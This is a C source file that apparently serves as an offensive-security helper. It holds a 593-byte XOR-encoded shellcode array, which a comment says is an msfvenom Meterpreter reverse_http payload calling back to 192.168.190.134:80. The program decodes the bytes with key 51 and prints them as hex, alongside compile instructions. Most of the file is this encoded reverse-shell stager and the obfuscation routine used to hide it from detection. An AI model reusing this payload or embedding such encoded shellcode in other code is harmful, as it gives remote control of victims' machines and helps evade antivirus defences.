#include <windows.h>
#include <stdio.h>

// compile: 
//	cl.exe /nologo /MT /Tcxor.c /link /out:xor.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

int main(void)
{	
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
	// python3 xor.py
	char shellcode[593] = {207, 123, 176, 215, 195, 219, 255, 51, 51, 51, 114, 98, 114, 99, 97, 123, 2, 225, 98, 101, 86, 123, 184, 97, 83, 123, 184, 97, 43, 123, 184, 97, 19, 126, 2, 250, 123, 184, 65, 99, 123, 60, 132, 121, 121, 123, 2, 243, 159, 15, 82, 79, 49, 31, 19, 114, 242, 250, 62, 114, 50, 242, 209, 222, 97, 123, 184, 97, 19, 114, 98, 184, 113, 15, 123, 50, 227, 85, 178, 75, 43, 56, 49, 60, 182, 65, 51, 51, 51, 184, 179, 187, 51, 51, 51, 123, 182, 243, 71, 84, 123, 50, 227, 119, 184, 115, 19, 99, 184, 123, 43, 122, 50, 227, 208, 101, 126, 2, 250, 123, 204, 250, 114, 184, 7, 187, 123, 50, 229, 123, 2, 243, 159, 114, 242, 250, 62, 114, 50, 242, 11, 211, 70, 194, 127, 48, 127, 23, 59, 118, 10, 226, 70, 235, 107, 119, 184, 115, 23, 122, 50, 227, 85, 114, 184, 63, 123, 119, 184, 115, 47, 122, 50, 227, 114, 184, 55, 187, 123, 50, 227, 114, 107, 114, 107, 109, 106, 105, 114, 107, 114, 106, 114, 105, 123, 176, 223, 19, 114, 97, 204, 211, 107, 114, 106, 105, 123, 184, 33, 218, 120, 204, 204, 204, 110, 123, 2, 232, 96, 122, 141, 68, 90, 93, 90, 93, 86, 71, 51, 114, 101, 123, 186, 210, 122, 244, 241, 127, 68, 21, 52, 204, 230, 96, 96, 123, 186, 210, 96, 105, 126, 2, 243, 126, 2, 250, 96, 96, 122, 137, 9, 101, 74, 148, 51, 51, 51, 51, 204, 230, 219, 35, 51, 51, 51, 2, 10, 1, 29, 2, 5, 11, 29, 2, 10, 3, 29, 2, 0, 7, 51, 105, 123, 186, 242, 122, 244, 243, 99, 51, 51, 51, 126, 2, 250, 96, 96, 89, 48, 96, 122, 137, 100, 186, 172, 245, 51, 51, 51, 51, 204, 230, 219, 123, 51, 51, 51, 28, 4, 124, 121, 84, 122, 1, 120, 95, 127, 124, 69, 74, 116, 69, 126, 106, 95, 30, 125, 98, 66, 98, 117, 88, 0, 96, 65, 10, 112, 107, 118, 100, 93, 68, 89, 81, 126, 69, 1, 4, 114, 10, 69, 112, 2, 121, 101, 108, 81, 81, 1, 69, 67, 120, 75, 81, 66, 87, 107, 118, 113, 116, 4, 85, 66, 84, 30, 127, 84, 81, 51, 123, 186, 242, 96, 105, 114, 107, 126, 2, 250, 96, 123, 139, 51, 49, 27, 183, 51, 51, 51, 51, 99, 96, 96, 122, 244, 241, 216, 102, 29, 8, 204, 230, 123, 186, 245, 89, 57, 108, 96, 105, 123, 186, 194, 126, 2, 250, 126, 2, 250, 96, 96, 122, 244, 241, 30, 53, 43, 72, 204, 230, 182, 243, 70, 44, 123, 244, 242, 187, 32, 51, 51, 122, 137, 119, 195, 6, 211, 51, 51, 51, 51, 204, 230, 123, 204, 252, 71, 49, 216, 255, 219, 102, 51, 51, 51, 96, 106, 89, 115, 105, 122, 186, 226, 242, 209, 35, 122, 244, 243, 51, 35, 51, 51, 122, 137, 107, 151, 96, 214, 51, 51, 51, 51, 204, 230, 123, 160, 96, 96, 123, 186, 212, 123, 186, 194, 123, 186, 233, 122, 244, 243, 51, 19, 51, 51, 122, 186, 202, 122, 137, 33, 165, 186, 209, 51, 51, 51, 51, 204, 230, 123, 176, 247, 19, 182, 243, 71, 129, 85, 184, 52, 123, 50, 240, 182, 243, 70, 225, 107, 240, 107, 89, 51, 106, 122, 244, 241, 195, 134, 145, 101, 204, 230};
	int xorkey = 51;
	

	//Uncomment this block to print out the shellcode to verify it matches

	// XOR each byte of our shellcode with the key to decode it
	for (int idx = 0;  idx < sizeof(shellcode); idx++) {
        shellcode[idx] = shellcode[idx] ^ xorkey;
	}

	int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}


	return 0;
}
          
